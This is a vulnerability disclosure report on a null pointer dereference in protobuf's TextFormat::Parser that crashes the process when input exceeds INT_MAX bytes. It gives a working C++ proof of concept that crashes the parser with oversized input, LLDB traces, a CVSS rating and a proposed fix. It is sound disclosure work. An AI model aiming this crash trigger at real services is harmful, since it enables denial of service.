# Protocol Buffers - TextFormat::Parser Null Pointer Dereference

**Project:** Protocol Buffers (protobuf)  
**Repository:** https://github.com/protocolbuffers/protobuf  
**Component:** TextFormat::Parser  
**File:** src/google/protobuf/text_format.cc  
**Lines:** 1945-1955  
**Severity:** Medium (CVSS 5.9)

---

## Summary

`TextFormat::Parser::ParseFromString()` crashes with SIGSEGV when input exceeds INT_MAX bytes. The function `CheckParseInputSize()` calls `error_collector->RecordError()` without null check. The `error_collector` defaults to `nullptr` in the Parser constructor.

---

## Vulnerable Code

**Parser constructor (line 1940):**

```cpp
TextFormat::Parser::Parser()
    : error_collector_(nullptr),  // NULL by default
      finder_(nullptr),
      ...
      recursion_limit_(std::numeric_limits<int>::max())
{}
```

**CheckParseInputSize (lines 1945-1955):**

```cpp
template <typename T>
bool CheckParseInputSize(T& input, io::ErrorCollector* error_collector) {
  if (input.size() > INT_MAX) {
    error_collector->RecordError(  // No null check - CRASH
        -1, 0,
        absl::StrCat("Input size too large: ", 
                     static_cast<int64_t>(input.size()),
                     " bytes > ", INT_MAX, " bytes."));
    return false;
  }
  return true;
}
```

---

## Proof of Concept

```cpp
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <climits>
#include <string_view>

#include "google/protobuf/any.pb.h"
#include "google/protobuf/text_format.h"

int main() {
  constexpr size_t kSize = static_cast<size_t>(INT_MAX) + 1;
  
  char path[] = "/tmp/protobuf-oversize.XXXXXX";
  int fd = mkstemp(path);
  unlink(path);
  ftruncate(fd, static_cast<off_t>(kSize));
  
  void* mapped = mmap(nullptr, kSize, PROT_READ, MAP_PRIVATE, fd, 0);
  
  google::protobuf::Any message;
  google::protobuf::TextFormat::Parser parser;
  
  bool ok = parser.ParseFromString(
      std::string_view(static_cast<const char*>(mapped), kSize), &message);
  
  munmap(mapped, kSize);
  close(fd);
  return ok ? 0 : 1;
}
```

**Compile & Run:**

```bash
clang++ -g -O0 -std=c++17 \
  $(pkg-config --cflags protobuf) \
  oversize_textformat.cc \
  $(pkg-config --libs protobuf) \
  -o oversize_textformat

./oversize_textformat
# Segmentation fault: 11
# Exit code: 139
```

---

## LLDB Verification

**Crash:**
```
(lldb) run
Process 40135 stopped
* thread #1, stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
    frame #0: CheckParseInputSize<std::string_view>() + 224
```

**Register state:**
```
(lldb) register read x19
     x19 = 0x0000000000000000
```

**Variables:**
```
(lldb) frame variable
(google::protobuf::TextFormat::Parser) parser = {
  error_collector_ = nullptr
  recursion_limit_ = 2147483647
}
(const size_t) kSize = 2147483648
```

**Backtrace:**
```
frame #0: CheckParseInputSize()
frame #1: ParseFromString()
frame #2: main() at oversize_textformat.cc:39
```

**Disassembly:**
```
->  0x100545ff4 <+224>: ldr    x8, [x19]        ; Load from NULL
    0x100545ff8 <+228>: ldr    x8, [x8, #0x10]
    0x100545ffc <+232>: mov    x0, x19
    0x100546000 <+236>: mov    w1, #-0x1
    0x100546004 <+240>: mov    w2, #0x0
    0x100546008 <+244>: blr    x8
```

---

## Impact

| Metric | Value |
|--------|-------|
| Crash Signal | SIGSEGV (11) |
| Exit Code | 139 |
| Crash Address | 0x0 |
| Trigger Size | > 2,147,483,647 bytes |
| Register | x19 = 0x0 |

**Affected functions:**
- ParseFromString()
- MergeFromString()
- Parse()
- ParseFromCord()

**Limitations:**
- Requires >2GB input
- Most services have size limits below this

---

## CVSS

**Score:** 5.9 (Medium)  
**Vector:** CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H

| Component | Value | Reason |
|-----------|-------|--------|
| AV | Network | Remote input |
| AC | High | Requires >2GB |
| PR | None | No auth needed |
| UI | None | Automatic |
| S | Unchanged | Local impact |
| C | None | No leak |
| I | None | No modification |
| A | High | Process crash |

---

## Fix

```cpp
template <typename T>
bool CheckParseInputSize(T& input, io::ErrorCollector* error_collector) {
  if (input.size() > INT_MAX) {
    if (error_collector != nullptr) {
      error_collector->RecordError(
          -1, 0,
          absl::StrCat("Input size too large: ", 
                       static_cast<int64_t>(input.size()),
                       " bytes > ", INT_MAX, " bytes."));
    }
    return false;
  }
  return true;
}
```

---

## Timeline

- 2026-04-13: Bug discovered
- 2026-04-13: PoC developed, crash confirmed
- 2026-04-13: LLDB debugging, null pointer at x19=0x0 confirmed
- 2026-04-13: Report prepared

---

## References

- Repository: https://github.com/protocolbuffers/protobuf
- Vulnerable code: src/google/protobuf/text_format.cc:1945-1955
- Parser constructor: src/google/protobuf/text_format.cc:1940
